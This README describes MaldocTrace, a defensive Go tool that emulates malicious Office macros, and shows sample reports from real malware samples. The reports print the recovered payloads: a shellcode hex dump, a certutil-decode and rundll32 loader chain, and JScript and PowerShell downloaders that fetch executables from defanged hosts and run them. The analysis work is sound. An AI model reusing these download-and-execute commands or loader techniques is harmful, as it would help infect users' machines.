# MaldocTrace

MaldocTrace is a defensive analyzer for malicious Office macros, written in Go. It extracts VBA from Office documents, rebuilds obfuscated strings, and emulates the macros in a fully simulated environment. The output reports what the document *would* do: the commands it would run, the payloads it would decode and the files it would drop. All of it is backed by evidence that points to the module, procedure and line that produced it.


---

## Features

- **Container extraction**: OLE/CFB (`.doc`, `.xls`, `.ppt`), OOXML (`.docm`, `.xlsm`, `.pptm`) and raw VBA text. Includes MS-OVBA decompression, UserForm control properties, and resource limits against zip bombs and malformed containers.
- **Document body text**: extracted from Word 97-2003 (piece table) and `.docx`. Droppers often hide their payload in the document body and read it back through `ActiveDocument.Paragraphs(n).Range.Text`.
- **VBA interpreter**: a lexer, parser and bounded interpreter covering the subset of VBA that malware relies on: procedures, `ByRef` parameters, named arguments, conditional compilation, loops, arrays and the string built-ins.
- **Static deobfuscation**: constant folding of `Chr`/`StrReverse`/`Replace`/concatenation. Each value records how it was rebuilt (`concatenation+Chr`, `StrReverse`, ...).
- **Simulated environment**:
  - processes: `WScript.Shell`, `Shell`, WMI `Win32_Process.Create` (both `GetObject` and `CreateObject("winmgmts:...")`)
  - files and network: `FileSystemObject`, `ADODB.Stream`, `XMLHTTP`/`WinHttp`
  - script engines: `MSScriptControl.ScriptControl`
  - Word's document model: `Paragraphs`, `Range`, `Delete`, `SaveAs2`
  - declared Windows APIs, with simulated `VarPtr` pointers
- **Payload recovery**:
  - PowerShell `-EncodedCommand` decoding, with static folding of `'ht'+'tp'` concatenations before URLs are extracted
  - UTF-7 shellcode buffers passed to `MultiByteToWideChar(CP_UTF7)`
  - `certutil -decode`, reproduced over a virtual file system built from what the macro wrote
  - scripts passed to `ScriptControl.AddCode`, reported as script payloads rather than command lines
  - PE/ZIP/OLE/PDF identification from file headers
- **Provenance everywhere**: commands, payloads and indicators carry evidence IDs (`event-3`, `command-1`, `payload-1`) and source locations. Secondary views refer to an item by its ID instead of repeating large blobs.
- **Robust against hostile input**: each pipeline stage recovers from panics and records the failure as a diagnostic. A bad sample therefore never kills a batch run. The VBA pipeline and the container parsers are fuzzed.

---

## Build

Requires Go 1.23+.

```bash
go build -o maldocTrace ./cmd/maldoctrace
```

On Windows:

```bash
go build -o maldocTrace.exe ./cmd/maldoctrace
```

## Usage

```
maldocTrace inspect <file>
maldocTrace extract <file> --out <dir> [--force]
maldocTrace analyze <file> [--format json|text|jsonl] [--timeout 30s] [--max-steps N]
                           [--input-format vba] [--show-strings] [--dump-payloads DIR]
maldocTrace analyze <dir> --recursive [--format jsonl] [--workers N]
maldocTrace version
```

| Option | Description |
|---|---|
| `--format text` | Human-readable report (default). |
| `--format json` | Full, versioned JSON report (schema `1.2.0`). It always includes indicators, diagnostics, decoded strings and full payload content. |
| `--format jsonl` | One JSON report per line, for batch analysis with `--recursive`. |
| `--show-strings` | Text format only. Lists the reconstructed strings, deduplicated, with every module/procedure/line occurrence and the reconstruction method. |
| `--dump-payloads DIR` | Writes decoded payloads and files dropped by the macro to `DIR/<input-sha256>/`, with a `manifest.json`. Files get neutral extensions (`.bin`, `.txt`), so nothing can run on a double-click. Existing files are never overwritten. |
| `--input-format vba` | Analyze a plain-text VBA file. |
| `--timeout`, `--max-steps` | Per-file time budget and interpreter step budget. |

Exit codes: `0` success (even when the sample is malicious), `1` analysis or internal error, `2` usage error.

---

## Examples

The four reports below come from real malicious documents and show the main recovery paths. Long blobs are shortened with `…`. The full values are in the JSON output.

### 1. UTF-7 shellcode loader (`MultiByteToWideChar` → `EnumUILanguages`)

The macro fills a byte array with UTF-7 text and copies it into RWX memory with `MultiByteToWideChar(65000, …, VarPtr(buf(0)), …)`. It then runs the memory through an `EnumUILanguages` callback. MaldocTrace resolves `VarPtr` to the array, captures the buffer and decodes the UTF-7 statically. The result is x64 shellcode (`90 55 48 89 e5` = `nop; push rbp; mov rbp,rsp`).

```
$ maldocTrace analyze 394c97cc9d567e556a357f129aea03f737cbd2a1761df32146ef69d93afc73dc.doc
MaldocTrace 0.1.0 (schema 1.2.0)
File: 394c97cc9d567e556a357f129aea03f737cbd2a1761df32146ef69d93afc73dc.doc (60418 bytes)
SHA-256: 394c97cc9d567e556a357f129aea03f737cbd2a1761df32146ef69d93afc73dc
Format: ooxml
Status: partial | Macros: present
Operational: completed | Semantic coverage: partial

-- Recovered commands --
  [command-1] In-memory payload via MultiByteToWideChar
      Command: +VZCJSFXlgUiA7A-\x00+6AA-\x00\x00+SF3tg0gSTY1IL8LHA3I-\x00+EfYxgEgbwf//SHXKgfNvqMHg5ITk5G+p/KRp…
      Receiver: kernel32.MultiByteToWideChar
      Source: ThisDocument.lllIiIjLliJjJIlJ:113 (inherited=false)
      Discovery: emulated_call
      Execution: simulated
      Resolution: resolved

-- Decoded payloads and recovered scripts --
  [payload-1] UTF-7 buffer (ljLLJJLJjjjjJijI(0))
      Category: binary | 1858 bytes | sha256=063d85ce18b08987b75b57c5e01d1d7e8183b54d56c4473eca415285cb28a555
      Encoding: UTF-7 → UTF-16LE
      Content (hex):
        90554889e5554881ec80000000e8000000005d4883ed12488d4d2f48c7c27203
        0000f61180311b48ffc148ffca75f381a86fe0c184e4e4e4a96fa4fca96984f4
        …
      Derived from: command-1
      Status: decoded

-- Entry points --
  ThisDocument.DoCUmeNT_OPEn  (Document_Open event)

-- Modules --
  ThisDocument  (document/class/designer, 137195 chars)

-- Simulated operations --
  #1 api_call [ThisDocument.lllIiIjLliJjJIlJ:112] -1  0 20480 12288 64
  #2 api_call [ThisDocument.lllIiIjLliJjJIlJ:113] → command-1
  #3 api_call [ThisDocument.lllIiIjLliJjJIlJ:114]  0 0 0

Reconstructed strings: 4395 (hidden; use --show-strings, or see decoded_strings in JSON)
```

### 2. Payload hidden in the document body (`certutil -decode` + `rundll32`)

The macro reads command fragments from paragraphs 2, 4, 6 and 8 of the document. Each one is cut with `Left()` to an exact length: `C:\Users\Public\`, `winmgmts:Win32_Process`, `Rundll32` and `Certutil -decode`. The macro then deletes the 3561-character decoy text and saves the rest of the body, a Base64-encoded PE, as `Ksh1.xls`. It decodes that file with `certutil` and loads the result with `rundll32`. MaldocTrace replays the whole chain over its simulated document and virtual file system and recovers the DLL.

```
$ maldocTrace analyze 7dbd8ecfada1d39a81a58c9468b91039.doc
MaldocTrace 0.1.0 (schema 1.2.0)
File: 7dbd8ecfada1d39a81a58c9468b91039.doc (850432 bytes)
SHA-256: dc40e48d2eb0e57cd16b1792bdccc185440f632783c7bcc87c955e1d4e88fc95
Format: cfb
Status: complete | Macros: present
Operational: completed | Semantic coverage: supported_subset

-- Recovered commands --
  [command-1] command
      Command: Certutil -decode C:\Users\Public\Ksh1.xls C:\Users\Public\Ksh1.pdf
      Receiver: Win32_Process.create
      Source: ThisDocument.SetTask:41 (inherited=true)
      Discovery: emulated_call
      Execution: simulated
      Resolution: resolved
  [command-2] command
      Command: Rundll32 C:\Users\Public\Ksh1.pdf,In
      Receiver: Win32_Process.create
      Source: ThisDocument.SetTask:41 (inherited=true)
      Discovery: emulated_call
      Execution: simulated
      Resolution: resolved

-- Decoded payloads and recovered scripts --
  [payload-1] certutil -decode output → C:\Users\Public\Ksh1.pdf
      Category: binary | 446976 bytes | sha256=fb07f875dc45e6045735513e75a83c50c78154851bd23a645d43ea853e6800ac
      Encoding: Base64 (certutil -decode)
      File type: PE32 DLL
        machine=0x014c
        compiled=2020-10-28T04:01:47Z
        sections=.text,.rdata,.data,.rsrc,.reloc
      Note: input C:\Users\Public\Ksh1.xls written by event-3
      Note: loaded by command-2: Rundll32 C:\Users\Public\Ksh1.pdf,In
      Content (hex, first 256 of 446976 bytes; full content in JSON decoded_payloads):
        4d5a90000300000004000000ffff0000b8000000000000004000000000000000
        …
      Derived from: command-1
      Status: decoded

-- Entry points --
  ThisDocument.Document_Close  (Document_Close event)
  ThisDocument.Form_Close  (ActiveX/event handler ending _close)

-- Modules --
  ThisDocument  (document/class/designer, 1510 chars)

-- Simulated operations --
  #1 create_object [ThisDocument.Form_Close:24] winmgmts:Win32_Process
  #2 document_range_edit [ThisDocument.Form_Close:27]
  #3 document_saveas [ThisDocument.SaveAs3:38] C:\Users\Public\Ksh1.xls
  #4 document_saveas [ThisDocument.SaveAs3:38] C:\Users\Public\Ksh1.doc
  #5 wmi_process_create [ThisDocument.SetTask:41] → command-1
  #6 api_call [ThisDocument.Form_Close:29] 6000
  #7 wmi_process_create [ThisDocument.SetTask:41] → command-2

-- Reconstructed artifacts --
  C:\Users\Public\Ksh1.xls sha256=9de083f693c144a38d697089f6560a2efe81b1ad1c5385ec07d6b41bb54b8ffe (595972 bytes)
  C:\Users\Public\Ksh1.doc sha256=9de083f693c144a38d697089f6560a2efe81b1ad1c5385ec07d6b41bb54b8ffe (595972 bytes)

Reconstructed strings: 20 (hidden; use --show-strings, or see decoded_strings in JSON)
```

`Form_Close` is a decoy name. It already runs inside `Document_Close`, so MaldocTrace does not replay it as a second entry point.

### 3. JScript through `MSScriptControl.ScriptControl`

The macro creates a `ScriptControl`, sets its language to JScript, adds a downloader through `AddCode` and then calls `Run "hexer"`. The JavaScript is reported as a **script payload**. `hexer` is reported as a **script function call**, not as an operating-system command. The `ScriptControl` object reaches the helper procedures through `ByRef` parameters, as it does in real VBA.

```
$ maldocTrace analyze 9eebae3cce1e63f01eaa6867ae8537cf19162527bb7e7d752282f0e20dc03a66.bin
MaldocTrace 0.1.0 (schema 1.2.0)
File: 9eebae3cce1e63f01eaa6867ae8537cf19162527bb7e7d752282f0e20dc03a66.bin (178819 bytes)
SHA-256: 9eebae3cce1e63f01eaa6867ae8537cf19162527bb7e7d752282f0e20dc03a66
Format: ooxml
Status: complete | Macros: present
Operational: completed | Semantic coverage: supported_subset

-- Decoded payloads and recovered scripts --
  [payload-1] Script (JScript) via ScriptControl.AddCode
      Category: script | Language: JScript | 555 bytes | sha256=cbf2ae49467472c81c8d7dc3492cae31073050a6ab41414a12a0e82c9f6ff7fa
      Defines: hexer
      Content:
        function hexer () { var shell = new ActiveXObject ("WScript.Shell");var fso = new ActiveXObject ("Scripting.FileSystemObject");var tmp_path = fso.GetSpecialFolder( 2) + "\\\\" + fso.GetTempName();var stream = new ActiveXObject ("ADODB.Stream");stream.Open();stream.Type = 1;stream.Position = 0; var ass = new ActiveXObject("Microsoft.XMLHTTP");ass.open("GET", "hxxp://northsidecollisiona2[.]com/load5.exe", 0);ass.send();stream.Write(ass.ResponseBody);stream.SaveToFile(tmp_path);stream.Close();var cmdrun = "cmd.exe /c " + tmp_path; shell.run(cmdrun, 0); }
      Derived from: event-2
      Status: recovered

-- Script engine calls (not OS commands) --
  [script-call-1] JScript MSScriptControl.ScriptControl.Run → hexer()
      Defined in: payload-1
      Source: ThisDocument.enamwy0:1403 (inherited=true)
      Execution: not_executed

-- Entry points --
  ThisDocument.AutoOpen  (AutoOpen)

-- Modules --
  ThisDocument  (document/class/designer, 28600 chars)

-- Simulated operations --
  #1 create_object [ThisDocument.eqxomy:1407] MSScriptControl.ScriptControl
  #2 script_add_code [ThisDocument.glufvaqv:1395] → payload-1
  #3 script_run [ThisDocument.enamwy0:1403] → script-call-1
  #4 document_range_edit [ThisDocument.ujsorzyca:1448]

Reconstructed strings: 292 (hidden; use --show-strings, or see decoded_strings in JSON)
```

### 4. PowerShell `-EncodedCommand` through WMI

The macro starts PowerShell through `winmgmts:Win32_Process.Create`. MaldocTrace decodes the Base64/UTF-16LE command and statically folds the `'ht'+'tp'+…` concatenations (nothing is executed). It then extracts the complete download URLs. Fragments such as `http://o` are never reported as URLs. The Base64 is printed in full only once; the other sections refer to it as `command-1`.

```
$ maldocTrace analyze PO-465514-180820.doc.bin
MaldocTrace 0.1.0 (schema 1.2.0)
File: PO-465514-180820.doc.bin (178840 bytes)
SHA-256: 044aa7e93ec81b297b53aaebad9bbac1a9d754219b001aaf5d4261665af30bc7
Format: cfb
Status: partial | Macros: present
Operational: completed | Semantic coverage: partial

-- Recovered commands --
  [command-1] PowerShell
      Command: powersheLL -e JABPAGcAbwB1AF8ANQAxAD0AKAAnAFEAdAA3ACcAKwAnADEAJwArACcAdABsADUAJwApADsALgAoACcAbgBlACcAKwAnAHcALQBp…
      Receiver: Win32_Process.Create
      Source: Qh300jh2fz8xvw.Hbpixwncmtfs0n:120 (inherited=true)
      Discovery: emulated_call
      Execution: simulated
      Resolution: resolved

-- Decoded payloads and recovered scripts --
  [payload-1] PowerShell EncodedCommand
      Category: encoded_command | Language: PowerShell | 2514 bytes | sha256=5d577b5d9853ff67f14930be4c6c1069c498760cb0276d986d95f8d300773632
      Encoding: Base64 → UTF-16LE
      Content (normalized: powershell_string_concatenation; raw in JSON):
        $Ogou_51=('Qt71tl5');.('new-item') $ENV:tEmp\OFFICE2019 -itemtype DiREctorY;[Net.ServicePointManager]::"S`eCUriTy`PrOT`OC`Ol" = ('tls12, tls11, tls');$Qakfo0q = ('Z0fv3kbg');$Brv35rs=('E6h4nkn');$Ec9w4e0=$env:temp+(('N3pOffice2019N3p')."re`Pl`AcE"('N3p',[sTriNg][CHaR]92))+$Qakfo0q+('.exe');$Z_jji3m=('Ogp57wj');$Y7jmxz8=&('new-object') NET.webcLIEnt;$Innewc_=('hxxp://52550750-56-20180826151453.webstarterz[.]com/savewayexpressthai.com/jnze_2o3j_k/*hxxp://oubaina[.]com/wp-includes/lqkz_nvr_1avf4/*hxxps://www.msbc[.]kz/data/k527_5_cbdvv5bi19/*hxxp://okcupidating[.]com/im/fsq_esj_qgx060p/*hxxp://bike-nomad[.]com/cgi-bin/7n_0x0_62mnzyh9q/')."sP`lIt"([char]42);$Fe8neg4=('Kymrw9w');foreach($Msuonh8 in $Innewc_){try{$Y7jmxz8."DoW`NLoAd`Fi`LE"($Msuonh8, $Ec9w4e0);$Ui3l49g=('Dohxbzg');If ((&('Get-Item') $Ec9w4e0)."lEng`Th" -ge 31451) {&('Invoke-Item')($Ec9w4e0);$Cwio_h5=('E6vp7vw');break;$Tay50lk=('Ph10gb1')}}catch{}}$U7tmnk4=('Yewcw8k')
      Derived from: command-1
      Status: decoded

-- Entry points --
  G6srlicitafymaaqhy.Document_open  (Document_Open event)

-- Modules --
  G6srlicitafymaaqhy  (document/class/designer, 365 chars)
  Qh300jh2fz8xvw  (document/class/designer, 10724 chars)

-- Simulated operations --
  #1 create_object [Qh300jh2fz8xvw.Hbpixwncmtfs0n:64] winmgmts:win32_Process
  #2 create_object [Qh300jh2fz8xvw.Vvdiedgnt3d:143] winmgmts:win32_ProcessstartuP
  #3 wmi_process_create [Qh300jh2fz8xvw.Hbpixwncmtfs0n:120] → command-1

Reconstructed strings: 98 (hidden; use --show-strings, or see decoded_strings in JSON)
```

### Dumping payloads

```
$ maldocTrace analyze 7dbd8ecfada1d39a81a58c9468b91039.doc --format json --dump-payloads ./dumps > report.json
dumped dumps/dc40e48d…/payload-1.bin      # the PE32 DLL (sha256 fb07f875…)
dumped dumps/dc40e48d…/artifact-1.bin     # C:\Users\Public\Ksh1.xls as written by the macro
dumped dumps/dc40e48d…/artifact-2.bin     # C:\Users\Public\Ksh1.doc
dumped dumps/dc40e48d…/manifest.json
```

For every file, `manifest.json` records the evidence ID, payload kind, detected file type, origin path, provenance (`written by event-3`, `loaded by command-2`) and both the report's sha256 and the written file's sha256.

---

## JSON report

`--format json` emits a self-contained, versioned report. The main sections are:

| Field | Content |
|---|---|
| `commands` | Recovered command lines and in-memory payload sinks, with receiver, source location, call chain and evidence IDs. |
| `decoded_payloads` | Decoded PowerShell, scripts, shellcode buffers and certutil outputs. Each payload has its raw and normalized content, encoding chain, sha256, file type and provenance. |
| `script_calls` | Script-engine invocations (`ScriptControl.Run/Eval/ExecuteStatement`). |
| `indicators` | Deduplicated URLs, domains, IPs, paths, registry keys and commands, with every occurrence. `same_as` and `part_of` link an indicator to the command or payload it duplicates. |
| `events` | Every simulated operation, with raw and resolved arguments. |
| `decoded_strings` | Statically reconstructed strings, with location and reconstruction method. |
| `artifacts` | Files written by the macro, with their hashes. |
| `diagnostics` | Analysis limitations, unsupported features and recovered internal errors. |

The text report omits indicators and diagnostics for readability. The JSON report always contains everything.

---

## Project layout

```
cmd/maldoctrace/   CLI (inspect, extract, analyze, payload dumping)
extractor/         CFB/OOXML containers, MS-OVBA, UserForms, Word body text
vba/lexer          VBA tokenizer
vba/parser         VBA parser (incl. conditional compilation, named arguments)
vba/runtime        Bounded VBA interpreter, built-ins, simulated pointers
deobfuscation/     Static constant folding with provenance
emulation/         Simulated COM objects, WMI, ScriptControl, Word document model
payload/           PowerShell, UTF-7, certutil decoding, concatenation folding, binary identification
indicators/        IOC extraction
report/            JSON schema and text renderer
```

## Testing

```bash
go test ./...
```

Regression tests that use real samples look for them in `samples/` and are skipped when that folder is missing. The samples are not distributed. The pipeline is fuzzed:

```bash
go test -run '^$' -fuzz '^FuzzAnalyzeVBA$' -fuzztime 60s .
go test -run '^$' -fuzz '^FuzzAnalyzeBytes$' -fuzztime 60s .
```

Inputs that made the fuzzers fail are kept under `testdata/fuzz/` as permanent regression cases.
